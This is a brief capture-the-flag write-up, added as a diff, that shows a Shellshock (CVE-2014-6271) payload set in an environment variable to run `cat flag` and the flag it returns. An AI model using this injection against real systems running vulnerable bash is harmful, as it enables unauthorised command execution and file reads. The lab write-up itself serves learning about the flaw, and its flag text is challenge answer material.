@@ -1,0 +1,6 @@
+we could exploit with a simple bnash command 
+export shock_me='() {:;}; cat flag'
+which will use the shellshock vulnrability to change the value of shock_me in shellshock.c a script that we could run 
+
+
+and then we run it and we get the flag: `only if I knew CVE-2014-6271 ten years ago..!!`
